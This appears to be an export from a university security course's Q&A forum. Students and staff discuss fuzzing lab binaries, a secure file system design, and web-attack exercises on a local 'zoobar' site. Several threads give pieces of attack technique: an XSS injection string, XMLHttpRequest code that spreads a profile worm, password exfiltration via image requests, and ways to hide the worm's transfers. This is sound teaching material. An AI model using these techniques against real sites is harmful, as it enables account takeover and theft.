<div><p>I used it without qemu, just with -n &#34;blind mode.&#34; However, it has run for 40 hours without finding a bug, so its probably worth it to install qemu. I did not figure out how to do this yet, though. </p></div>
<h2>Followup</h2>
<div><p>How did you run it blind? I am doing this and its not working:</p>
<p><b>httpd&#64;vm-6858</b>:<b>~/for_6_858/afl-2.52b</b>$ ./afl-fuzz -i ../testsmall.bin -o findings_dir ../morty &#64;&#64;</p>
<p>can you show me the actual command? </p></div>
<h3>Followup Response</h3>
<div><p></p><p>./afl-2.52b/afl-fuzz -n -i testcase_dir/ -o output_dir/ ./rick &#64;&#64; </p>
<p></p>
<p>where testcase_dir has a copy of ./testsmall.bin inside of it. </p></div><hr><h1>Should groups have their own version struct?</h1>
<h3>2018-04-29T18:12:01Z</h3>
<div><p>This seems undefined in the SUNDR paper, so could be up to our interpretation and design choices, but wanted to check. If groups do not have their own VS, then in order to resolve a group&#39;s i, we have to traverse through all VS&#39;s for users and see if a group&#39;s ihandle is in that VS. But we may also run into a VS that has an outdated ihandle for the group...<br /><br />If groups do have their own VS&#39;s, who is supposed to sign this VS?</p></div>
<h2>Student Answer</h2>
<div><p>I am quite sure that the VSes are per user (groups do not have VSes). But VSes have version numbers for all principals (including groups). Can you use that number to get the freshest ihandle for each group?</p></div>
<h2>Staff Answer</h2>
<div><p>Shinjini is right that VSes are per user (none per group) and the user signs on group ihandles of the group that they belong to. It is up to you how you want to get the latest ihandle for each group, but you should have enough information to work it out. </p></div><hr><h1>Lab 4 Challenge</h1>
<h3>2018-04-29T10:15:05Z</h3>
<div><p>I have a local version working for this exercise, but it times out when running through make check. After some debugging it seems as though the &#39;page.onLoadFinished&#39; phantomJS callback is occurring before my html has had time to redirect, which then stalls the script. I originally was doing the redirection on &#39;window.onload&#39; when it was not working.</p>
<p>However, if I use &#39;&lt;meta http-equiv=&#34;refresh&#34;...&#39; or if I *only* set &#39;window.location&#39; to the target url, it is fast enough to occur before onLoadFinished. At this point I am a little stuck as to how to inject code seemingly without time to modify the DOM or issue a POST request?</p></div>
<h2>Student Answer</h2>
<div><p>i had the exact same problem</p>
<p></p>
<p>it&#39;s <em>extremely tricky</em></p>
<p></p>
<p>because it&#39;s not what you think</p>
<p></p>
<p>hint: page.onLoadFinished is completely unrelated to you problem</p></div><hr><h1>Lava files</h1>
<h3>2018-04-28T18:23:13Z</h3>
<div><p>How are we supposed to run the &#96;rick&#96; and &#96;morty&#96; files? I tried</p>
<p></p>
<pre>cat testsmall.bin | ./morty</pre>
<p></p>
<p>but I get </p>
<p></p>
<pre>-bash: ./morty: cannot execute binary file: Exec format error</pre>
<p></p></div>
<h2>Staff Answer</h2>
<div>It’s a Linux ELF file so make sure you’re on Linux first </div>
<h2>Followup</h2>
<div><p>Should one get a segmentation fault when running either program on the sample input?</p></div>
<h3>Followup Response</h3>
<div>That doesn’t sound right, maybe something to do with 32bit compatibility mode? I think they are 32bit elf. Try running it in gdb and see what he segfault is <p></p></div>
<h3>Followup Response</h3>
<div><p>Run the following commands: &#34;./rick testsmall.bin&#34; and &#34;./morty testsmall.bin&#34; to run the code for starters ... that gives normal looking outputs rather than a segfault.</p></div>
<h2>Followup</h2>
<div><p>Does that mean they should be run in the 6858 VM?</p>
<p>The athena clusters?</p>
<p>Do they work on Mac OS? Or only Linux?</p></div>
<h3>Followup Response</h3>
<div>VM or Athena work, MacOSX does not.</div>
<h2>Followup</h2>
<div><p>How do you call rick and morty with custom inputs?</p></div>
<h3>Followup Response</h3>
<div>Not sure what the inputs are, you may wanna run “hexdump” on them and try to reverse engineer the file structure.</div>
<h3>Followup Response</h3>
<div><p>thanks! Just wanted to make sure that was the right way to go about it. </p></div>
<h2>Followup</h2>
<div>Also in case you don’t have experience with static analysis, there’s a free tool called IDA that is very very helpful </div>
<h2>Followup</h2>
<div><p>I still don&#39;t understand how to run this. If I&#39;m running these files in the vm, how do I actually load the files into there? Could someone please give me a step by step for how to run this code with inputs? </p></div>
<h3>Followup Response</h3>
<div>Copy the URL of the zip from the 6.858 website then call <div><br /></div><div>‘wget &lt;URL&gt;’ inside the vm to download the zip.</div><div>‘unzip &lt;zip file&gt;’ to unzip it</div><div><br /></div><div><br /></div></div>
<h3>Followup Response</h3>
<div><p>Thank you. Once I have the files in my VM how do i actually run them with inputs?</p></div>
<h3>Followup Response</h3>
<div>./rick &lt;input&gt; same for morty<div><br /></div><div>You might need to make them executable with chmod first.</div></div><hr><h1>setTimeout() time</h1>
<h3>2018-04-28T18:03:00Z</h3>
<div><p>For Lab 4, I&#39;m guessing we use setTimeout (as per instructions in Exercise 11) to give the newImage() object enough time to send the request to the email server.</p>
<p></p>
<p>What is a good time to set for setTimeout? Would points be taken off if it seems like the login page takes too long? (Is 1500 msec ok)</p></div>
<h2>Followup</h2>
<div><p>Also, I kept trying to use the .onload() function of the new Image() object, but it would never fire, even if I added that image to the document body. I guess it&#39;s because the email server never sends a response?</p></div>
<h3>Followup Response</h3>
<div><p>That&#39;s because the image does not exist.</p>
<p></p>
<p>Don&#39;t use onload(), use onerror().</p></div>
<h2>Student Answer</h2>
<div><p>Use onerror(), it&#39;s much more reliable.</p>
<p></p>
<p>If you must use setTimeout(), use 100ms (source: TA response in &#64;590), as 1500ms is <em>way too long</em>.</p></div><hr><h1>&#34;All your server state *must* go here&#34; in secfs-server</h1>
<h3>2018-04-28T17:55:58Z</h3>
<div><p>There&#39;s a message in the constructor of SecFSRPC saying that &#34;all server state must go here&#34; - is this implying all server state needs to be in the self.blocks dictionary, or can we make our own alternative data structures?</p></div>
<h2>Staff Answer</h2>
<div><p>Either using self.blocks or making your own data structure should be fine as long as it fits with your design. </p></div><hr><h1>Ex 14 - Profile Not Executable</h1>
<h3>2018-04-28T13:26:47Z</h3>
<div><p>When I enter python code into a users profile, even just using the regular UI, the code doesn&#39;t run but instead shows up as plaintext with the white space removed when viewed from the Users page by someone else. I begin the profile with &#34;#!python&#34;. Not even the sample profiles given from lab 2 function. I checked and my git folder is up to date. I&#39;m not really sure what to do. </p>
<p></p>
<p></p></div>
<h2>Student Answer</h2>
<div><p>When you go to /users and search for another user&#39;s profile, try inspecting where that user&#39;s profile code shows up in that page&#39;s HTML --&gt; you prob don&#39;t want to be writing python but rather HTML :)</p></div><hr><h1>What secfs code is the client and what is the server?</h1>
<h3>2018-04-28T04:03:14Z</h3>
<div><p>After completing the warmup exercise 0, it still isn&#39;t clear to me whether everything in the secfs directory is code for the client or server</p></div>
<h2>Staff Answer</h2>
<div><p>Most of the SecFS implementation in is secfs/*.  The untrusted server is in bin/secfs-server. </p>
<p></p>
<p>For exercise 1, you would want to look at secfs/tables.py and skim through the methods that are available there. For sending/receiving VSL, think about at what point in time should the client send/receive VSL and modify the methods that are called at that point.</p></div>
<h2>Student Answer</h2>
<div><p>Update: I realized bin/secfs-fuse and bin/secfs-server are python files, not binaries!</p></div><hr><h1>Should opening answer-11.html result in a page that looks exactly like zoobar?</h1>
<h3>2018-04-28T03:24:50Z</h3>
<div><p>Right now, it doesn&#39;t show the image of the lion because it can&#39;t find it in the local directory. Should I make sure my html and zoobar look completely the same for exercises 9 and beyond?</p></div>
<h2>Student Answer</h2>
<div>&#64;508 kind of answers this: basically, it’s not a very effective attack if it doesn’t look the exact same, right?</div>
<h2>Followup</h2>
<div>Original answerer again: as a caveat to what I said above, I don’t think they’re /actually/ grading for this.</div><hr><h1>log headers shifted?</h1>
<h3>2018-04-27T22:42:18Z</h3>
<div><p>In 14, I&#39;m successfully hiding the log entries but failing the appearance tests because 1. the images are apparently slightly bigger for some reason (on infected profiles only, not the attacker), and 2. the spacing between the headings of the log entries is changed. Anyone had a similar problem/know what might be causing this?</p></div>
<h2>Student Answer</h2>
<div>Seems like styling changes? Try inspect element on the differing elements and see how the effective styles have changed</div><hr><h1>Get mail from testing locally but not from make check</h1>
<h3>2018-04-27T21:15:57Z</h3>
<div><p>Hi! When I run make check I don&#39;t get any emails, but when I manually click on the form I get an email. Does anyone know how I should go about starting to debug this? Thanks!</p></div>
<h2>Student Answer</h2>
<div>It could be a race condition. Are you doing the lab’s suggested setTimeout() thing?</div><hr><h1>lab5: Second client error?</h1>
<h3>2018-04-27T19:56:14Z</h3>
<div><p>I am trying to implement VSLs, and I think I am writing my VSLs to the server (I think the second client is being able to get to it), but then I get this error:</p>
<p></p>
<pre>httpd&#64;vm-6858:~/secfs$ fuse: failed to access mountpoint /home/httpd/secfs/mnt2: Transport endpoint is not connected<br />Traceback (most recent call last):<br />  File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;<br />    exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))<br />  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 604, in &lt;module&gt;<br />    llfuse.init(sfs, mountpoint, [&#39;fsname=tmpfs&#39;, &#34;nonempty&#34;, &#34;allow_other&#34;])<br />  File &#34;src/fuse_api.pxi&#34;, line 264, in llfuse.init (src/llfuse.c:37952)<br />RuntimeError: fuse_mount failed</pre>
<p></p>
<p>Any thoughts on what this could be?</p>
<p></p>
<p>I used to get </p>
<pre>LookupError: asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist</pre>
<p></p>
<p>but now I don&#39;t, so I&#39;m guessing I resolved that?</p></div>
<h2>Staff Answer</h2>
<div><p>Did you run the following to mount it? </p>
<p></p>
<pre><code>sudo venv/bin/secfs-fuse PYRO:secfs&#64;./u:server.sock mnt2/ root.pub user-0-key.pem &#34;user-$(id -u)-key.pem&#34; &gt; client.log &amp;</code></pre></div>
<h2>Followup</h2>
<div><p>Yes, I used that command.</p></div><hr><h1>Print Statements in code</h1>
<h3>2018-04-27T17:15:43Z</h3>
<div><p>If I write print statements in files like tables.py, where should I be able to see the output? </p></div>
<h2>Staff Answer</h2>
<div><p>You&#39;ll generally find them in *.log</p>
<p></p>
<p>If you&#39;re running with ./start.sh, the output will be client.log</p>
<p>If you&#39;re running with ./test.sh, the output will be primaryclient.log, and if it crashes early, the error output can be found in primaryclient.err</p>
<p></p>
<p></p>
<p></p></div><hr><h1>Suddenly cant register or login</h1>
<h3>2018-04-27T16:27:43Z</h3>
<div><p>Today when I started trying to work on the lab, I&#39;m no longer able to get the website to work. The login page loads, but I can&#39;t register or login. When I try to register a new user, I get:</p>
<p><tt>OperationalError: (pysqlite2.dbapi2.OperationalError) attempt to write a readonly database [SQL: u&#39;INSERT INTO person (username, password, token, zoobars, profile) VALUES (?, ?, ?, ?, ?)&#39;] [parameters: (u&#39;d&#39;, u&#39;d&#39;, None, 10, &#39;&#39;)]</tt></p>
<p><tt> </tt></p>
<p>Why would this suddenly be happening? I haven&#39;t changed anything with permissions (in fact I didn&#39;t change anything between last night when it was working and today when it&#39;s not). I&#39;m still able to run <tt>sudo make check</tt> and pass all the tests that I was passing before, but I can&#39;t test anything in my browser which is making it really hard to finish exercise 14.</p></div>
<h2>Staff Answer</h2>
<div><p>Can you try &#96;make check&#96; instead of sudo make check and see whether you still have that issue after finish the check?</p></div>
<h2>Followup</h2>
<div>I also get this error - has anyone been able to solve it? I still have the same issue after running &#39;make check.&#39;</div>
<h3>Followup Response</h3>
<div><p>I&#39;m the one who asked the original question and I&#39;m not entirely sure what fixed it for me. It may have been running &#39;make check&#39; except that I actually get some permissions error when I run &#39;make check&#39; instead of &#39;sudo make check&#39; and I&#39;m not sure whether &#39;make check&#39; or something else I tried fixed it because I was trying a lot of things all around the same time. Sorry I&#39;m not more helpful </p></div><hr><h1>Ex 13</h1>
<h3>2018-04-27T15:57:58Z</h3>
<div><p>I am trying to access the right file for ex 13. But when I try to load it using HTML tags, I get the following error in my console &#34;SyntaxError: expected property name, got &#39;{&#39; &#34;. Why is this happening? If I try to load the file via URL it loads fine.</p></div>
<h2>Staff Answer</h2>
<div><p>.js doesn&#39;t typically has syntax below</p>
<pre>var var_name = {{var_value}}</pre>
<p>That&#39;s why it&#39;s complaining about expecting property name not {{...}}<br />Check what zoobar page do using &#34;view page source&#34; to include that file. </p></div><hr><h1>Ex 12 time out</h1>
<h3>2018-04-27T07:58:50Z</h3>
<div><p>My ex 12 works when I test it in browser but fails the test case; after entering the grader username/pw into the form, the grading script times out.</p>
<p></p>
<p>My solution is to add click event listeners to both the &#34;Log in&#34; and &#34;Register&#34; buttons. In each event handler, I preventDefault(), email the pw, delay for 500 ms, and click on the appropriate button.</p></div>
<h2>Student Answer</h2>
<div><p>Hmm, I used a callback to wait for the email to send instead of setTimeout()</p>
<p></p>
<p>much more reliable</p></div>
<h2>Staff Answer</h2>
<div><p>setTimeout should be fine. Try 100 and see if it fix your problem </p></div>
<h2>Followup</h2>
<div><p>Is 100ms the upper bound for the email network request?</p></div>
<h2>Followup</h2>
<div><p>Make sure you are not confusing the test case for exercise 11 with exercise 12. The checker registers the users for exercise 11 after printing &#34;[INFO] checking for exercise 11&#34; and not before.</p>
<p></p></div><hr><h1>accessing the transfer log, ex 14 lab 4</h1>
<h3>2018-04-27T04:27:30Z</h3>
<div><p>im having a weird error where if i print &#34;document.getElementsByClassName(&#34;log&#34;)&#34; then it prints an HTMLCollection with the transfer log as the 0th element in it, with length 1, but if i print &#34;document.getElementsByClassName(&#34;log&#34;)[0]&#34; it prints undefined or if i print &#34;document.getElementsByClassName(&#34;log&#34;).length&#34; it prints zero. whats going on?</p></div>
<h2>Student Answer</h2>
<div><p>ahhh resolved, needed an event listener</p></div><hr><h1>what should transfer log look like in exercise 14</h1>
<h3>2018-04-27T02:51:36Z</h3>
<div><p>I am confused about what the transfer log should look like when I &#34;hide my tracks&#34;. I don&#39;t understand why in <a href="https://www.piazza.com/class/javuduq1qek22s?cid=551" target="_blank">&#64;551</a> it says that I should clear the whole log and reset zoobars of the user being viewed to 10.</p>
<p></p>
<p>For example in this scenario:</p>
<p>user &#34;A&#34; has the profile worm and user &#34;B&#34; legitimately sends 5 zoobars to A</p>
<p>but when user B looks at user A in the users tab, it sends 1 zoobar secretly to attacker (which doesn&#39;t show up in the log) and then the log is cleared and A&#39;s zoobars are reset to 10</p>
<p></p>
<p>how is that hiding tracks? I feel like that is more obvious that something fishy is going on </p></div>
<h2>Student Answer</h2>
<div><p>I imagine this is just to make it a little easier for us. I agree that hiding our tracks well would treat worm-transfers differently - one could, e.g., just go through the transfer log and hide all entries which are sending 1 zoobar to attacker and then pretend that the user still has those zoobars (though note that this still doesn&#39;t catch the case of users who sent 1 zoobar to attacker on purpose sometime). I think you&#39;d still pass everything in &#96;make check&#96; if you implement this, because I don&#39;t think it does extra transfers, so your result would look the same either way. But it&#39;s safer to just implement it as request in the lab handout (and you save yourself some time). Put the extra work into the challenge if you want to go above and beyond =)</p></div><hr><h1>Ex 13 only password?</h1>
<h3>2018-04-27T02:42:38Z</h3>
<div><p>For Exercise 13, the &#34;make check&#34; script seems to only accept a password, instead of &#34;user/password&#34; like in Ex 11 and 12.</p>
<p>Just want to confirm that this is the wanted behavior.</p></div>
<h2>Student Answer</h2>
<div><p>yeah, &#64;542</p></div><hr><h1>How to submit profile update?</h1>
<h3>2018-04-27T01:42:35Z</h3>
<div><p>I figured out how to get a reference to the text I want to submit as a visitor&#39;s new profile, but I can&#39;t for the life of me figure out how to actually submit the profile form. I assume I&#39;m supposed to be using XMLHttpRequest like <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send#Example_POST" target="_blank">this</a>, but I&#39;m not sure what URL to send it to/parameter names to use?</p></div>
<h2>Staff Answer</h2>
<div><p>Good way to start:</p>
<p>View page source on home page where you can update your profile. Then, figure out how that profile form submission work. </p></div>
<h2>Student Answer</h2>
<div><p>Look at index.py.</p></div>
<h2>Followup</h2>
<div><p>So I assume I want to be talking to /zoobar/index.cgi, but I&#39;m still not sure what to do parameters-wise with the XMLHttpRequest? I&#39;ve been looking at that page source but I don&#39;t really understand how that works either--I assume pressing the button causes the POST request to be sent (despite forms seeming to require javascript on other pages?), but there&#39;s no action defined, so I&#39;d think it&#39;s going to the root URL, but that contradicts what the student answer is pointing out about index handling it...?</p></div>
<h3>Followup Response</h3>
<div><p>Root URL is index.html</p>
<p></p>
<p>For any website, / is an alias for /index.html. (Directories can&#39;t be web pages, only files can).</p>
<p></p>
<p>For instance, web.mit.edu is an alias (shorthand) for web.mit.edu/index.html</p></div>
<h3>Followup Response</h3>
<div><p>Okay, so just sending the empty string as the middle parameter of req.open would make it go where I want. How do I know how to format the request, though? I thought it might be http.send(&#34;profile_update=&#34;&#43;[stuff]); but that didn&#39;t seem to work. I see in index.py that profile_update needs to be a key, but I can&#39;t figure out exactly what that means in the context of an outgoing XMLHttpRequest.</p></div>
<h3>Followup Response</h3>
<div><p>(whoops, couldn&#39;t decide if i was using a placeholder or not, req and http are both meant to be an XMLHttpRequest object)</p></div>
<h3>Followup Response</h3>
<div><p>are you using a POST request?</p></div>
<h3>Followup Response</h3>
<div><p>Yes, after creating the request I have http.open(&#34;POST&#34;, &#39;&#39;, true);</p></div>
<h3>Followup Response</h3>
<div><p>I noticed two issues. First you need to specify absolute path (url) in XMLHttpRequest .open(), i.e. <a href="http://localhost..">http://localhost..</a>.<br /><br />Second you almost right using  http.send(&#34;profile_update=&#34;&#43;[stuff]);<br /><br />After fixing first issue, you should be able to infect other user profile but the code that you infect to other&#39;s profile might not be as you expect. If this happen, I guess you know what&#39;s wrong with your .send(&#34;profile_update=&#34;&#43;[stuff]);<br /><br /></p></div>
<h3>Followup Response</h3>
<div><p>Be sure that you use URL encoding.</p></div>
<h3>Followup Response</h3>
<div><p>^Yep! that&#39;s the answer of second issue I mentioned :)</p></div>
<h3>Followup Response</h3>
<div><p>I still can&#39;t make it work, even to change a user&#39;s profile to &#34;hello world&#34;. ;_; Sorry for posting so much code, but I&#39;m not sure how else to sort it out. If I log in as a user and do this in the console:</p>
<p></p>
<pre>var http = new XMLHttpRequest();
http.open(&#34;POST&#34;, &#39;http://localhost:8080/&#39;, true);
http.send(&#34;profile_update=helloworld&#34;); </pre>
<p>The logged-in user&#39;s profile doesn&#39;t change. I also tried with <a href="http://localhost:8080/zoobar/index.cgi">http://localhost:8080/zoobar/index.cgi</a> and nothing happened for that either. I see the point about the URL encoding, but I&#39;m not even making it far enough to have that problem.</p></div>
<h3>Followup Response</h3>
<div><p>You must <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" target="_blank">set the header</a>. It is not optional.</p></div>
<h3>Followup Response</h3>
<div><p>also, it took me quite a while to figure out the XHRs. It&#39;s a lot easier to create an invisible form and call submit() on that.</p></div>
<h3>Followup Response</h3>
<div><p>I tried that at first, I actually have the invisible form on the page and can modify the value of the textarea, but calling .click() on profile_submit doesn&#39;t seem to do anything either and .submit() on profileform or profile_submit throws an error.</p>
<p></p>
<p>Re: doing it the XML way, if profile_update=[text] is an argument to .send(), how do you figure out what goes in the header?</p>
<p></p>
<p>(Thank you very much for you help also, and sorry for spamming your email with these notifications.)</p></div>
<h3>Followup Response</h3>
<div><p>Note that if you want to <code>POST</code> data, you may have to set the MIME type of the request. For example, use the following before calling <code>send()</code> for form data sent as a query string:</p>
<pre><code></code>httpRequest.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</pre></div>
<h3>Followup Response</h3>
<div><p>Read this: https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX/Getting_Started</p></div>
<h3>Followup Response</h3>
<div><p>Okay, I see, thanks! Added .setRequestHeader, presumably this is in fact a query string I&#39;m sending. Now I have this: </p>
<p></p>
<pre>var http = new XMLHttpRequest();
http.onreadystatechange = function(){};
http.open(&#34;POST&#34;, &#39;http://localhost:8080&#39;, true);
http.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);
http.send(&#34;profile_update=&#34;&#43;encodeURIComponent(payload)); </pre>
<p>And it does seem to go through and get a response from the server:</p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hzneed7i7y26oj/jgibyx8cddjt/Screen_Shot_20180427_at_3.08.16_PM.png" alt="" /></p>
<p>And... it&#39;s still not working. Not sure if I need that second line, but I tried with and without it. Sorry again for being a pain, but any idea what I&#39;m doing wrong? No idea where to begin debugging since I&#39;m not getting any error messages anywhere, the profile just doesn&#39;t change.</p></div>
<h3>Followup Response</h3>
<div><p>you don&#39;t need that second line.</p>
<p></p>
<p>Other than that, the XHR structure seems correct.</p>
<p></p>
<p>Are you viewing the profile from a different account?</p>
<p></p>
<p>You should create &lt;user1&gt;, put the script as the profile of &lt;user1&gt;, then create &lt;user2&gt; and navigate to the page of &lt;user1&gt;, see if &lt;user2&gt;&#39;s profile changes when you go to their home page.</p></div>
<h3>Followup Response</h3>
<div><p>s2g that&#39;s what I&#39;m doing. :( Oh well, thank you very much for the help! I&#39;ll keep playing with it.</p></div>
<h3>Followup Response</h3>
<div><p>The point is not about the second line. It&#39;s this line </p>
<pre>http.open(&#34;POST&#34;, &#39;http://localhost:8080&#39;, true);</pre>
<p>Your url will need to be more specific to the request (follow POST form). You got the path correct earlier using <a href="http://localhost:8080/zoobar/index.cgi" target="_blank">http://localhost:8080/zoobar/index.cgi</a>/ . Fix that and see if you still have issue.</p></div>
<h3>Followup Response</h3>
<div><p>oh yeah, that too ^</p></div>
<h3>Followup Response</h3>
<div><p>Got it! Thank you both so much. What a journey lol</p></div><hr><h1>Can&#39;t get file with XMLHttpRequest</h1>
<h3>2018-04-26T19:02:12Z</h3>
<div><p>I&#39;m getting &#34;XMLHttpRequest Exception 101: A network error occurred in synchronous requests&#34; for number 13. I&#39;m fairly sure I&#39;m trying to get the right file--is there something else that could be causing this? </p></div>
<h2>Student Answer</h2>
<div><p>Resolved, was misunderstanding XMLHttpRequest usage rules wrt SOP</p></div>
<h2>Followup</h2>
<div><p>Yeah, don&#39;t use AJAX...</p></div><hr><h1>Part 3 login page appearance</h1>
<h3>2018-04-26T17:28:12Z</h3>
<div><p>Is it necessary for the login page to look like the actual one for exercises 9-12 in Part 3? The beginning of the lab mentions that &#34;Exercises 5, 13, and 14, as well as the challenge exercise, require that the displayed site look a certain way,&#34; so I only added in the css for the login page for exercise 13. Do I need to back propagate those changes to the earlier exercises too?</p></div>
<h2>Followup</h2>
<div><p>I think only those 4 exercises should be fine. That said, it would be good to get instructor confirmation.</p></div>
<h2>Staff Answer</h2>
<div>All exercise that check script compare pixel will require zoobar site style. For part two, no need to do any styling. For part three, the goal is to fake page, so do styling on this part.</div><hr><h1>modifying a profile?</h1>
<h3>2018-04-26T17:23:54Z</h3>
<div><p>i cant figure out how to modify the profile considering there is no script in it. i tried inserting code through the profile text area but it doesnt seem to be working because &#34;&lt;&#34; is being encoded as &#34;&amp;lt;&#34;. not sure where to go from here, any hints would be appreciated!</p></div>
<h2>Student Answer</h2>
<div><p>injection</p></div>
<h2>Followup</h2>
<div><p>yes, but how do i inject javascript or html when textarea encodes away the &#34;&lt;&#34; and &#34;&gt;&#34;? could the dynamic title be exploited?</p></div>
<h3>Followup Response</h3>
<div><p>that&#39;s strange, the &lt; and &gt; don&#39;t get encoded away for me</p>
<p></p>
<p>are you sure you have the right version of lab 4?</p></div>
<h3>Followup Response</h3>
<div><p>im pretty sure i am? i followed the instructions in the lab so im not sure why it would be the wrong version. im putting &#34;faketext&lt;/textarea&gt;&lt;script&gt;blah blah blah javascript&lt;/script&gt;&lt;textarea&gt;faketext&#34; in the text area and its just encoding all the inequality signs to &amp;lt; and &amp;gt;</p></div>
<h3>Followup Response</h3>
<div><p>don&#39;t put the textarea tags</p></div>
<h3>Followup Response</h3>
<div><p>that&#39;s still not working, like the script tag looks like &amp;lt;script&amp;gt; in the page source instead of injecting into the html<br /></p></div>
<h3>Followup Response</h3>
<div><p>weird</p>
<p></p>
<p>maybe try re-pulling lab 4 in a different folder (so it&#39;s fresh) and then put your exercise 14 into that (but no other modifications to /lab)</p>
<p></p>
<p>note that you&#39;re not supposed to merge in any changes from labs 1, 2, 3</p></div>
<h3>Followup Response</h3>
<div><p>it did not merge changes from other lab, i tried that but it says already up to date and im in the lab4 branch, so i dont think that&#39;s the issue. could it be because im writing it straight in the profile text box instead of putting it in answer-14.txt? if so then how do i test my exploit in the actual website?</p></div>
<h3>Followup Response</h3>
<div><p>does your exploit work with make check?</p>
<p></p>
<p>also, it should work on both the website and the grader</p>
<p></p>
<p>and git pull doesn&#39;t detect if you&#39;ve made further changes</p>
<p>do <strong>git status</strong> and <strong>git diff</strong> and <strong>git log</strong> to make sure that your only changes are adding the answer-* files and you haven&#39;t changed anything in zoobar/</p></div>
<h3>Followup Response</h3>
<div><p>im still fleshing the exploit out, i wanted to be able to test it step by step in the website.</p>
<p></p>
<p>i tried cloning the lab in another directory and branching to lab 4, and im having the same problem even with running zookld from a fresh directory.</p>
<p></p>
<p>some sites are saying that you cant inject html into textarea tags? (<a href="https://stackoverflow.com/questions/2580247/can-i-embed-html-formatting-inside-of-a-textarea-tag#2580264">https://stackoverflow.com/questions/2580247/can-i-embed-html-formatting-inside-of-a-textarea-tag#2580264</a>)</p></div>
<h3>Followup Response</h3>
<div><p>(ps thanks for the help)</p></div>
<h3>Followup Response</h3>
<div><p>OH. i figured out what i was doing wrong.  i shouldve been testing it being viewed by someone else, not myself.</p></div><hr><h1>exercise 14 timeout</h1>
<h3>2018-04-26T07:59:19Z</h3>
<div><p>In the handout, it says &#34;The transfer and replication should be reasonably fast (under 15 seconds)&#34;. However, it seems like in lab4-tests/grade-ex14.js, the timeout for taking a screenshot is set to 2 seconds. Is the handout supposed to say 1.5 seconds instead?</p></div>
<h2>Followup</h2>
<div><p>2 seconds should still be plenty of time?</p></div><hr><h1>Ex14 Weird Bug Occuring</h1>
<h3>2018-04-26T03:52:41Z</h3>
<div><p>I&#39;ve completed exercise 14.</p>
<p><br />I tested the exercise by hand. I load my attack script into the attacker&#39;s account profile. I view the profile from an account, grader. grader becomes infected and transfers 1 zoobar to attacker. Then, I view grader from another account, grader2. grader2 becomes infected and transfers 1 zoobar to attacker. All of my html elements on the page are hidden, including the transfer log (as specified in the instructions) in under 15 seconds. (My code uses waits totaling 6 seconds).</p>
<p></p>
<p>When I run make check, I pass the first three tests for exercise 14, then fail the rest (grader2 zoobars, grader2 image...). Here&#39;s the weird part. Now, if I try to run the server I encounter a permissions error when I try to login to the website saying there&#39;s no read access to the database?! I&#39;m not changing permissions anywhere. </p>
<p></p>
<p>Not sure how to proceed because it seems to be working besides make check.</p></div>
<h2>Student Answer</h2>
<div><p>Not sure if this is the reason, but &#34;make check&#34; will erase (or delete) the entire DB on start up, but won&#39;t erase it or restore it after it finishes. So for example, you can&#39;t register &#34;attacker&#34; after &#34;make check&#34; because &#34;make check&#34; will register one (and not delete it). The workaround I found is to re-run &#34;make check&#34; but (extremely) quickly Ctrl-C immediately after it starts. So it will help you erase the DB but gets terminated before it has a chance to register any users. </p></div>
<h2>Followup</h2>
<div><p>Did you do anything to fix it? I am seeing a similar issue.</p></div>
<h3>Followup Response</h3>
<div><p>Basically, all the balances seem to have been updated fine, the logs show nothing, the zoobars on the user profile page always show 10. However, tests after the first set all fail and the reference picture doesn&#39;t line up with what my code generates though when i run it by hand I see the same image.</p></div>
<h3>Followup Response</h3>
<div>Compare the output image and reference in lab4-test directory. Then use inspector to edit and move elements around  inccorect area.<div>Many things can affect UI. One example is that visibility: hidden and display: none might work differently unlike what you expect on different HTML components.  Try play around with that. See if it fix your issue. </div></div>
<h3>Followup Response</h3>
<div><p>Its not just the UI. I changed display:none to visibility:hidden and this persists.</p>
<p></p>
<p>I think the profile isn&#39;t getting replicated to grader1 when it initially views the attacker&#39;s profile. Subsequently when grader2 views grader1&#39;s profile, it sees the normal 9 zoobars and the log of the transaction with the attacker and none of its own zoobars are transferred to the attacker. This explains why the second and third set of tests fail.</p>
<p></p>
<p>Essentially, the worm isn&#39;t propagating. But, when I test it out myself, I&#39;m able to see it propagate, so I&#39;m not entirely sure what is happening or if some urls are messed up. Any help is appreciated.</p></div>
<h3>Followup Response</h3>
<div><p>It was an issue with the response parsing after a successful XMLHttpRequest that was causing a failure in replication.</p></div>
<h3>Followup Response</h3>
<div><p>Did you manage to solve this? If not, I wonder have you test it manually via browser to confirm that any user viewing attacker profile get inject with exactly the same code as what an attacker have in his profile. Next use other user2 view user1 and see if you still got exactly the same code as attacker.</p></div>
<h3>Followup Response</h3>
<div><p>Two scenerios can happen here. Let me know which one is your case<br />1. user1 and user2 got partial code injected<br />2. user1 or user2 got no code injected at all</p></div>
<h3>Followup Response</h3>
<div><p>I fixed it, basically the profile wasn&#39;t propagating because the response from the XMlHttpRequest wasn&#39;t parsed correctly and so an empty profile was being propagated.</p></div><hr><h1>NETWORK_ERR: XMLHttpRequest Exception 101: A network error occurred in synchronous requests.</h1>
<h3>2018-04-26T02:38:59Z</h3>
<div><p>When I try to send to the email script via an XMLHttpRequest, I get this error when I run make check. It seems like this is some kind of issue that occurs because of phantomjs.</p></div>
<h2>Student Answer</h2>
<div><p>It&#39;s not an issue with phantomjs.</p>
<p></p>
<p>You&#39;re not allowed to issue cross-domain XHRs.</p>
<p></p>
<p>Ajax is only allowed same-origin.</p></div><hr><h1>Trouble with Form Submission</h1>
<h3>2018-04-26T02:05:37Z</h3>
<div><p>I am having some real trouble getting the page to redirect to the login page after a form submit. My event handler for submit currently prevents the default action, send the email and then tried to resubmit the form after a timeout of 500ms. However, it just doesn&#39;t seem to login and/or submit the form even though I always get the email. I initially assumed it was because the form parameters were getting cleared, but they look identical before and after the preventDefault.</p>
<p></p>
<p>I&#39;ve spent many hours trying to fix this and any help would be really appreciated</p></div>
<h2>Student Answer</h2>
